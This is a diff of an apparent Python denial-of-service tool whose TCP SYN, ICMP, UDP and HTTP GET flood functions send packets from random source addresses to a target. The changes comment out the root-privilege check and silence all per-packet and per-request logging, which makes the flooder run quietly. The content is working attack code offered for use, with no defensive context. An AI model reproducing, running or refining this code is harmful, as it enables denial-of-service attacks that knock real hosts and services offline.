@@ -12,8 +12,8 @@ from time import sleep, time
 from random import randint
 
 # Check for root
-if not (name == 'nt' and __import__('ctypes').windll.shell32.IsUserAnAdmin() != 0) or (name != 'nt' and __import__('os').geteuid() == 0):
-    _exit("This script must be run with root privileges!")
+# if not (name == 'nt' and __import__('ctypes').windll.shell32.IsUserAnAdmin() != 0) or (name != 'nt' and __import__('os').geteuid() == 0):
+#     _exit("This script must be run with root privileges!")
 
 # Suppress scapy warnings
 scapy_logging.getLogger("scapy.runtime").setLevel(scapy_logging.ERROR)
@@ -89,7 +89,7 @@ def tcp_syn_flood(destination_ip, packet_size, thread_num):
         send(packet, verbose = False)  # Response: SYN/ACK
         total_sent += packet_size
         source_ips.add(source_ip)
-        logger.info(f"\033[1;35m[THREAD {thread_num}] \033[1;91m\xBB \033[1;93m{packet_size}\033[1;92m bytes sent to \033[1;93m{destination_ip}\033[1;92m through port \033[1;93m{port} \033[1;92mfrom \033[1;93m{source_ip}")
+        # logger.info(f"\033[1;35m[THREAD {thread_num}] \033[1;91m\xBB \033[1;93m{packet_size}\033[1;92m bytes sent to \033[1;93m{destination_ip}\033[1;92m through port \033[1;93m{port} \033[1;92mfrom \033[1;93m{source_ip}")
 
 def icmp_flood(destination_ip, packet_size, thread_num):
     global total_sent
@@ -100,7 +100,7 @@ def icmp_flood(destination_ip, packet_size, thread_num):
         send(packet, verbose = False)
         total_sent += packet_size
         source_ips.add(source_ip)
-        logger.info(f"\033[1;35m[THREAD {thread_num}] \033[1;91m\xBB \033[1;93m{packet_size}\033[1;92m bytes sent to \033[1;93m{destination_ip}\033[1;92m from \033[1;93m{source_ip}")
+        # logger.info(f"\033[1;35m[THREAD {thread_num}] \033[1;91m\xBB \033[1;93m{packet_size}\033[1;92m bytes sent to \033[1;93m{destination_ip}\033[1;92m from \033[1;93m{source_ip}")
 
 def udp_flood(destination_ip, packet_size, thread_num):
     global total_sent
@@ -114,7 +114,7 @@ def udp_flood(destination_ip, packet_size, thread_num):
         send(packet, verbose = False)
         total_sent += packet_size
         source_ips.add(source_ip)
-        logger.info(f"\033[1;35m[THREAD {thread_num}] \033[1;91m\xBB \033[1;93m{packet_size}\033[1;92m bytes sent to \033[1;93m{destination_ip}\033[1;92m through port \033[1;93m{port} \033[1;92mfrom \033[1;93m{source_ip}")
+        # logger.info(f"\033[1;35m[THREAD {thread_num}] \033[1;91m\xBB \033[1;93m{packet_size}\033[1;92m bytes sent to \033[1;93m{destination_ip}\033[1;92m through port \033[1;93m{port} \033[1;92mfrom \033[1;93m{source_ip}")
 
 async def send_request(session, url, retries = 3):
     global total_sent
@@ -128,14 +128,17 @@ async def send_request(session, url, retries = 3):
             async with session.get(url, headers = headers, ssl = False) as response:  # Disable SSL verification
                 total_sent += 1
                 status_color = '\033[1;92m' if 200 <= response.status < 300 else '\033[1;93m' if 300 <= response.status < 400 else '\033[1;91m'
-                return logger.info(f"\033[1;93mHTTP GET\033[1;92m request sent to \033[1;93m{url} \033[1;91m\xBB \033[1;94m[ {status_color}{response.status} {response.reason}\033[1;94m ]")
+                return
+                # return logger.info(f"\033[1;93mHTTP GET\033[1;92m request sent to \033[1;93m{url} \033[1;91m\xBB \033[1;94m[ {status_color}{response.status} {response.reason}\033[1;94m ]")
         except TimeoutError:
             if attempt < retries - 1:
                 await asynsleep(2 ** attempt)  # Exponential backoff
                 continue
-            return logger.error("Request timed out!")
+            return
+            # return logger.error("Request timed out!")
         except ClientError as e:
-            return logger.error(f"Client Error: {e}")
+            return
+            # return logger.error(f"Client Error: {e}")
 
 async def http_flood(url, num_requests):
     connector = TCPConnector()
